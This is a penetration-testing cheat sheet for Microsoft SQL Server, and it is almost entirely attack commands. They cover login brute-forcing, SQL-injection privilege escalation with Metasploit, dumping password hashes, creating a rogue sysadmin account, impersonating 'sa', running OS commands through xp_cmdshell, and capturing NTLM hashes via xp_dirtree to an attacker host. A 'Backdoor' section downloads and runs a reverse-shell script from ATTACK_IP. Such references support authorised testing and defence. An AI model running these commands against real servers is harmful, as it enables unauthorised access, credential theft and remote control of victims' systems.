# 1. Pentest MS SQL server 

MSSQL port:    1433

**Summery:** 

- [1. Pentest MS SQL server](#1-pentest-ms-sql-server)
- [2. Recon](#2-recon)
  - [2.1. Check info](#21-check-info)
- [3. Attack](#3-attack)
  - [3.1. Test Empty Password](#31-test-empty-password)
  - [3.2. Login brutforce](#32-login-brutforce)
  - [3.3. Enumerate MSSQL](#33-enumerate-mssql)
  - [3.4. SQLi - Priv esc with msf](#34-sqli---priv-esc-with-msf)
    - [3.4.1. mssql_escalate_dbowner_sqli](#341-mssql_escalate_dbowner_sqli)
    - [3.4.2. mssql_escalate_execute_as_sqli](#342-mssql_escalate_execute_as_sqli)
  - [3.5. Run query](#35-run-query)
    - [3.5.1. Default Databases](#351-default-databases)
    - [3.5.2. Query](#352-query)
      - [3.5.2.1. Users](#3521-users)
        - [3.5.2.1.1. User impersonation](#35211-user-impersonation)
      - [3.5.2.2. Databases](#3522-databases)
        - [3.5.2.2.1. Exploit Trusted Links](#35221-exploit-trusted-links)
      - [3.5.2.3. Run command](#3523-run-command)
      - [3.5.2.4. NTLM Service Hash gathering](#3524-ntlm-service-hash-gathering)
  - [3.6. Exploit cme](#36-exploit-cme)
  - [3.7. Exploit](#37-exploit)
  - [3.8. Backdoor](#38-backdoor)
- [4. Sources](#4-sources)

# 2. Recon 

## 2.1. Check info  
> nmap 

	nmap -sU -p 1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-tables TARGET_IP

> msf

```ruby
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS TARGET_IP
run
```
# 3. Attack
## 3.1. Test Empty Password
```ruby
nmap -p 1433 --script ms-sql-empty-password TARGET_IP
```
## 3.2. Login brutforce 
```ruby
use auxiliary/scanner/mssql/mssql_login
set RHOSTS TARGET_IP
set user_file /root/Desktop/user.txt
set pass_file /root/Desktop/pass.txt
run
```

## 3.3. Enumerate MSSQL
```ruby
use auxiliary/admin/mssql/mssql_enum
set RHOSTS TARGET_IP
set password PASSWORD
run
```
## 3.4. SQLi - Priv esc with msf 

### 3.4.1. mssql_escalate_dbowner_sqli
> 
msfconsole
```ruby
use auxiliary/admin/mssql/mssql_escalate_dbowner_sqli
set DATA destination='+and+1=[SQLi];--&password=1
set GET_PATH '/index.php'
set METHOD POST 
set RHOSTS TARGET_IP
set RPORT 80
```
### 3.4.2. mssql_escalate_execute_as_sqli
```ruby
use admin/mssql/mssql_escalate_execute_as_sqli
set DATA destination='+and+1=[SQLi];--&password=1
set GET_PATH '/index.php'
set METHOD POST 
set RHOSTS TARGET_IP
set RPORT 80
```
## 3.5. Run query 
```ruby
mssqlclient.py 'USERNAME:PASSWORD@TARGET_IP'
mssqlclient.py 'USERNAME:PASSWORD@TARGET_IP' -db DATABASE
```

### 3.5.1. Default Databases

    [*] master
    [*] model
    [*] msdb
    [*] tempdb

### 3.5.2. Query 

#### 3.5.2.1. Users

List users
```sql
SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```
List users and Hashs 
```sql
SELECT name, password_hash FROM master.sys.sql_logins
```
List sysadmin users
```sql
SELECT loginname FROM syslogins WHERE sysadmin = 1;
```
Create user
```sql
EXEC master..sp_addlogin hacker, secret
```
Create user with sysadmin privs
```sql
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
sp_addsrvrolemember 'hacker', 'sysadmin';
```
Check current user priv
```sql
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('dbcreator');
SELECT is_srvrolemember('bulkadmin');
SELECT is_srvrolemember('diskadmin');
SELECT is_srvrolemember('processadmin');
SELECT is_srvrolemember('serveradmin');
SELECT is_srvrolemember('setupadmin');
SELECT is_srvrolemember('securityadmin');
```

##### 3.5.2.1.1. User impersonation

List users that can be impersonated

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

Impersonating user

> Check current user 

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

> Impersonate user 

```sql
EXECUTE AS LOGIN = 'sa'
```

> Check if successfully impersonate user

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### 3.5.2.2. Databases

> Show trustworthy databases
```sql
SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;
```
> Set database as trustworthy
```sql
ALTER DATABASE DatabaseName SET TRUSTWORTHY ON
```
> Manual
```sql
SELECT name FROM master.dbo.sysdatabases #Get databases
SELECT table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES; #Get tables names
SELECT table_catalog,table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.columns; #Get columns names
```
##### 3.5.2.2.1. Exploit Trusted Links

List trusted links
```sql
select * from master..sysservers
```
Execute query on the server
```sql
SELECT * from OPENQUERY ("ServerName",'select @@version')
```
#### 3.5.2.3. Run command

```powershell
EXEC master..xp_cmdshell 'whoami'
EXEC master.dbo.xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami'
```
####  3.5.2.4. NTLM Service Hash gathering
```powershell
xp_dirtree '\\ATTACK_IP\any\thing'
exec master.dbo.xp_dirtree '\\ATTACK_IP\any\thing'
exec master..xp_dirtree '\\ATTACK_IP\any\thing'
```

## 3.6. Exploit cme

> cme

	cme mssql TARGET_IP -u USERNAME -p PASSWORD
	cme mssql TARGET_IP -u USERNAME -p PASSWORD -a normal


> Run command 

	cme mssql TARGET_IP -u USERNAME -p PASSWORD -a normal -x 'whoami'

## 3.7. Exploit

    msf > use exploit/windows/mssql/mssql_payload
    msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp


## 3.8. Backdoor
```powershell
EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://ATTACK_IP:8000/rev.ps1") | powershell -noprofile'
```

# 4. Sources 

- https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
- http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/
- https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/
- https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/
- http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet